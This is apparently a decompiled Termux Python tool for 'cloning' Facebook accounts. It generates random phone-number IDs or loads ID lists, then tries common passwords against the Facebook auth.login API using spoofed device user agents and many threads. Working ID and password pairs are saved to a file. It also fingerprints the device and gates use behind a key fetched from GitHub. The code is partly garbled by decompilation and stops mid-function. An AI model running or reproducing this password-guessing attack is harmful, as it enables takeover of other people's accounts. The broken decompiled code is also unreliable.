
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


from os import path
import requests
import random
import uuid
import string
import hashlib
import json
from os import path
import os
import uuid
import base64
import requests
import zlib
import httpx
import time
import platform
import datetime
from time import localtime as lt
from urllib.request import urlopen
import os
import base64
import zlib
import pip
import urllib
import urllib3
import platform
import math
import smtplib
import platform
import smtplib
import math
import os
import base64
import zlib
import pip
import urllib
first = '/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if 'print' not in open(first + 'sessions.py', 'r').read():
    pass
exit('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')

def clear():
    os.system('clear')

os.system('clear')
print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE...!\x1b[38;5;244m [\x1b[38;5;46m–\x1b[38;5;244m]\x1b[1;97m')
time.sleep(3)
os.system('clear')
print('\x1b[38;5;244m[\x1b[38;5;46m●\x1b[38;5;244m]\x1b[38;5;46m LODING ●\x1b[38;5;47m●\x1b[38;5;48m●\x1b[38;5;49m●\x1b[38;5;50m●\x1b[38;5;244m [\x1b[38;5;46mMR.ALONE [BEST-[💚] TOOL\x1b[38;5;244m]\x1b[1;97m')
time.sleep(2)
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
if ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python HOP.py')
dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
date = str(tgl) + '\x1b[38;5;244m-\x1b[38;5;46m' + str(bln) + '\x1b[38;5;244m-\x1b[38;5;46m' + str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
a = ltx
tag = 'AM'
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release', shell = True).decode('utf-8').replace('\n', '')
model = subprocess.check_output('getprop ro.product.model', shell = True).decode('utf-8').replace('\n', '')
build = subprocess.check_output('getprop ro.build.id', shell = True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell = True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output('getprop ro.product.brand', shell = True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell = True).decode('utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell = True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell = True).decode('utf-8').replace('\n', '')
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')
total = 0
for i in fbcr:
    total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
if select == '2':
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[1].replace('\n', '')
    sim_id += fbcr
    if Exception:
        e = None
        fbcr = 'Zong'
        sim_id += fbcr
        e = None
        del e
        e = None
        del e
fbcr = 'Zong'
sim_id += fbcr
fbcr = 'Zong'
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm }
loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
uid = []
plist = []
sys.stdout.write('\x1b]2; =[💚]-MR-ALONE-[💚]=\x07')
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

def clear():
    os.system('clear')
    print(logo)


def linex():
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')


def HOP_M1():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ";'[FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]"
    return ua


def HOP_M2():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ";'[FBAN/Orca-Android;FBAV/299.0.0.11.115;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/272301973;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2042};FB_FW/1;]"
    return ua


def HOP_M3():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ";'[FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;] FBBK/1"
    return ua


def HOP_M4():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ";'[FBAN/Orca-Android;FBAV/253.0.0.17.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/200372525;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBDV/SM-N975U;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2759};FB_FW/1;] FBBK/1"
    return ua


def HOP_M5():
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ";'[FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
    return ua


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'''5{bx}.{bV}'''
    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
        '2',
        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'''5{cx}.{cV}'''
    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
        '2',
        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
    return random.choice([
        A,
        B,
        C,
        D])

import os
import httpx
sexkey = 'MR~(' + str(os.getuid()) + '=(ALONE)=' + str(os.getuid()) + ')~KING'

def approval():
    sexkey = 'MR~(' + str(os.getuid()) + '=(ALONE)=' + str(os.getuid()) + ')~KING'
    ress = httpx.get('https://github.com/Mr-Alon/File-Cloning-Free/blob/main/Approve.txt').text
    if sexkey in ress:
        menu()
        return None
    None('\x1b[38;5;244m KEY IS NOT APPROVED')
    os.system('clear')
    print(logo)
    print('\x1b[38;5;46m < !!...FAST APROVE YOUR KEY...!! > ')
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
    input('\x1b[38;5;244m(\x1b[1;97mA\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO SEND KEY ADMIN > ')
    time.sleep(2)
    tks = sexkey
    os.system('xdg-open https://wa.me/+8801863231665')

logo = f'''\n\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[1;97m\x1b[42m[●▬▬▬▬▬๑🌸🕌\x1b[1;97m\x1b[42m[Bismillahir \x1b[38;5;208m\x1b[1;97mRahmanir Rahim]🕌🌸๑▬▬▬▬▬▬●\x1b[1;97m]\x1b[0m\x1b[1;92m║\n\x1b[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n\x1b[1;92m┃ ┳┳┓┳┓ ┏┓┓ ┏┓┳┓┏┓ ┃\x1b[1;92m ᎪႮͲᎻϴᎡ  \x1b[1;92m:\x1b[1;92mMD SHOVON SHARIER SOHAG\x1b[1;92m ┃\n\x1b[1;92m┃ ┃┃┃┣┫ ┣┫┃ ┃┃┃┃┣  ┃\x1b[1;92m FACEBOOK\x1b[1;92m:\x1b[1;92mMD SHOVON SHARIER SOHAG\x1b[1;92m ┃\n\x1b[1;92m┃ ┛ ┗┛┗•┛┗┗┛┗┛┛┗┗┛ ┃\x1b[1;92m GITHUB  \x1b[1;92m:\x1b[1;92mMR-ALON                 \x1b[1;92m┃\n\x1b[1;92m┣━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┫\n\x1b[1;92m┃\x1b[1;92mͲOOL:\x1b[1;92mFILE & RANDOM\x1b[1;92m\x1b[1;92m┃ \x1b[1;92mՏTATUS\x1b[1;92m ░▒𝐏𝐀𝐈𝐃▒░\x1b[1;92m ┃\x1b[1;92m VERSION\x1b[1;92m:\x1b[1;92mV-9.8\x1b[1;92m  ┃\n\x1b[1;92m╚━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━╝\n\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[1;97m\x1b[42m[<🕌Assalamualaikum\x1b[38;5;208m"\x1b[1;97mMind It,\'You Will Never Alone🕌>\x1b[1;97m]\x1b[0m\x1b[1;92m║\n\x1b[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\x1b[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n║\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m KEY ━\x1b[38;5;244m➤ \x1b[38;5;46m{sexkey}      \x1b[1;97m       \x1b[1;92m║\n\x1b[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝'''

def _old_():
    user = []
    clear()
    print('\x1b[38;5;244m(\x1b[1;97mA\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mEXAMPLE : \x1b[38;5;46m3000\x1b[38;5;244m/\x1b[38;5;46m5000\x1b[38;5;244m/\x1b[38;5;46m10000\x1b[38;5;244m/\x1b[38;5;46m99999')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = input('\x1b[38;5;244m(\x1b[1;97mA\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mINPUT : ')
    clear()
    print('\x1b[38;5;244m(\x1b[1;97m1\x1b[38;5;244m) \x1b[38;5;46mMETHOD \x1b[38;5;244m(\x1b[38;5;46m2009-2014\x1b[38;5;244m) \x1b[38;5;46m')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    ask = input('\x1b[38;5;244m(\x1b[1;97mA\x1b[38;5;244m)\x1b[38;5;46m \x1b[38;5;46mINPUT : ')
    if ask in ('1',):
        star = '10000'
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 0x2540BE3FFL)))
            user.append(data)
            star = '100000'
            for i in range(int(limit)):
                data = str(random.choice(range(100000000, 999999999)))
                user.append(data)
                crack_submit = tred(max_workers = 40)
                clear()
                print(f'''\x1b[38;5;244m(\x1b[1;97mA\x1b[38;5;244m)\x1b[38;5;46m\x1b[38;5;46m TOTAL ID \x1b[38;5;244m–\x1b[38;5;46m➤{A} {limit} \x1b[38;5;244m(\x1b[1;97mA\x1b[38;5;244m)\x1b[38;5;46m\x1b[38;5;46m METHOD \x1b[38;5;244m–\x1b[38;5;46m➤ {A}M{ask}''')
                print('\x1b[38;5;244m(\x1b[1;97mA\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE')
                print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                for mal in user:
                    uid = star + mal
                    crack_submit.submit(login, uid)
                    None(None, None)
                    return None
                    if not None:
                        pass

loop = 0
oks = []
cps = []

def login(uid):
    global loop
    Session = requests.session()
    sys.stdout.write(f'''\r\x1b[38;5;244m(\x1b[38;5;46m{date}\x1b[38;5;244m)\x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m[\x1b[38;5;46m{loop}\x1b[38;5;244m]\x1b[38;5;244m-\x1b[38;5;46m➤\x1b[38;5;244m[\x1b[38;5;46m{len(oks)}\x1b[38;5;244m/\x1b[38;5;46m{len(cps)}\x1b[38;5;244m]''')
    sys.stdout.flush()
    for pw in ('123456', '1234567', '12345678', '123456789', '123123', '112233', '1234567890'):
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': windows(),
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger' }
        rp = Session.get('https://api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
        if 'session_key' in rp:
            print(f'''\r\x1b[38;5;244m(\x1b[38;5;244mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;244m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}''')
            open('/sdcard/ALONE-OLD.txt', 'a').write(uid + '|' + pw + '\n')
            cps.append(uid)
        if 'www.facebook.com' in rp['error_msg']:
            print(f'''\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}''')
            open('/sdcard/ALONE-OLD.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        if 'Please Confirm Email' in str(rp):
            print(f'''\r\x1b[38;5;244m(\x1b[38;5;46mALONE-OK[💚]\x1b[38;5;244m)\x1b[38;5;46m {uid} ━\x1b[38;5;244m➤\x1b[38;5;46m {pw}''')
            open('/sdcard/ALONE-OLD.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        loop += 1
        return None
        return None


def menu():
    clear()
    print(f'''\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m FILE CLONING \n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m RANDOM CLONING\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m OLD CLONING\n\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m EXIT TOOL''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    xd = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ''')
    if xd in ('1', '01'):
        clear()
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : /sdcard/XX.txt ''')
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        file = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m FILE NAME : ''')
        fo = open(file, 'r').read().splitlines()
        if FileNotFoundError:
            print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m FILE LOCATION NOT FOUND ''')
            time.sleep(1)
            menu()
        clear()
        print(f'''\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1)<>\x1b[38;5;81m[BD/INDIA]\x1b[38;5;244m\n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2)<>\x1b[38;5;81m[NEPAL/INDIA]\x1b[38;5;244m\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M3)<>\x1b[38;5;81m[MIX-ALL]\x1b[38;5;244m\n\x1b[38;5;244m({A}4\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M4)<>\x1b[38;5;81m[BD]\x1b[38;5;244m\n\x1b[38;5;244m({A}5\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M5)<>\x1b[38;5;81m[INDIA]\x1b[38;5;244m''')
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        mthd = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ''')
        clear()
        ps_limit = int(input(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m PASSWORD LIMIT : '''))
        ps_limit = 1
        clear()
        print('\x1b[38;5;244m[\x1b[1;97mA\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
        print('\x1b[38;5;244m[\x1b[1;97mA\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ')
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for i in range(ps_limit):
            plist.append(input(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m PASSWORD NO {i + 1} \x1b[38;5;244m–\x1b[38;5;46m➤{A} '''))
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            print('\x1b[38;5;244m[\x1b[1;97mA\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46mfirst last \x1b[38;5;244m|\x1b[38;5;46m first123')
            print('\x1b[38;5;244m[\x1b[1;97mA\x1b[38;5;244m] \x1b[38;5;46mEXAMPLE \x1b[1;97m● \x1b[38;5;46m57273200 59039200 57575751 ')
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            clear()
            print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m DO YOU WENT SHOW CP ACCOUNT ➤ \x1b[38;5;244m[\x1b[38;5;46mY\x1b[38;5;244m/\x1b[1;91mN\x1b[38;5;244m]''')
            print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            cx = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ''')
            if cx in ('y', 'Y', 'yes', 'Yes', '1'):
                pcp.append('y')
        pcp.append('n')
        crack_submit = tred(max_workers = 30)
        clear()
        total_ids = str(len(fo))
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL ACCOUNT \x1b[38;5;244m–\x1b[38;5;46m➤{A} ''' + total_ids + f''' \x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m PASS \x1b[38;5;244m–\x1b[38;5;46m➤{A} {ps_limit}''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]''')
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for user in fo:
            (ids, names) = user.split('|')
            passlist = plist
            if mthd in ('1', '01'):
                crack_submit.submit(api1, ids, names, passlist)
            if mthd in ('2', '02'):
                crack_submit.submit(api2, ids, names, passlist)
            if mthd in ('3', '03'):
                crack_submit.submit(api3, ids, names, passlist)
            if mthd in ('4', '04'):
                crack_submit.submit(api4, ids, names, passlist)
            if mthd in ('5', '05'):
                crack_submit.submit(api5, ids, names, passlist)
            None(None, None)
            if not None:
                pass
        print('\x1b[1;37m')
        print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m THE PROCESS HAS COMPLETED''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL OK/CP : ''' + str(len(oks)) + '/' + str(len(cps)))
        print('\r\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')
        input(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m PRESS ENTER TO BACK ''')
        menu()
        return None
    if xd in ('2', '02'):
        randm()
        return None
    if None in ('3', '03'):
        _old_()
        return None
    if None in ('0', '05'):
        exit(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXIT DONE ''')
        return None
    None(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m OPTION NOT FOUND IN MENU...''')
    return None
    if ValueError:
        exit()
        return None
    if None.exceptions.ConnectionError:
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m NO INTERNET CONNECTION...''')
        exit()
        return None


def randm():
    clear()
    print(f'''\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m BANGLADESH CLONING ''')
    print(f'''\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m INDIA CLONING ''')
    print(f'''\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m NEPAL CLONING ''')
    print(f'''\x1b[38;5;244m({A}0\x1b[38;5;244m)\x1b[38;5;46m BACK TO MENU ''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    option = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE : ''')
    if option in ('1', 'A'):
        bd()
        return None
    if None in ('2', 'B'):
        india()
        return None
    if None in ('3', 'C'):
        nepal()
        return None
    if None in ('0', '00'):
        menu()
        return None
    None(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m BYE BYE ''')


def bd():
    user = []
    clear()
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 017 | 019 | 018 | 016 ''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    code = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ''')
    clear()
    print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m EXAMPLE : 3000 | 5000 | 10000 | 99999 ''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : '''))
    clear()
    print(f'''\x1b[38;5;244m({A}1\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M1\x1b[38;5;244m)\n\x1b[38;5;244m({A}2\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M2\x1b[38;5;244m)\n\x1b[38;5;244m({A}3\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M3\x1b[38;5;244m)\n\x1b[38;5;244m({A}4\x1b[38;5;244m)\x1b[38;5;46m METHOD \x1b[38;5;244m({A}M4\x1b[38;5;244m)''')
    print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    mthd = input(f'''\x1b[38;5;244m({A}?\x1b[38;5;244m)\x1b[38;5;46m CHOICE  : ''')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(8)())
        user.append(nmp)
        habib = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m SIM CODE :{A} {code} ''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m TOTAL ID :{A} {tl} ''')
        print(f'''\x1b[38;5;244m({A}A\x1b[38;5;244m)\x1b[38;5;46m IF NO RESULT \x1b[38;5;244m[\x1b[38;5;46mON\x1b[38;5;244m/\x1b[38;5;46mOFF\x1b[38;5;244m]\x1b[38;5;46m AIRPLANE MODE{B}[{A}M{mthd}{B}]''')
        print('\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for psx in user:
            uid = code + psx
            passlist = [
                uid,
                psx,
                uid[:8],
                uid[:7],
                uid[:6],
                'nusrat',
                'bangladesh',
                'i love you',
                'sumaiya',
                'mababa',
                'tamanna']
            if mthd in ('1', '01'):
                habib.submit(rndm1, uid, passlist)
            if mthd in ('2', '02'):
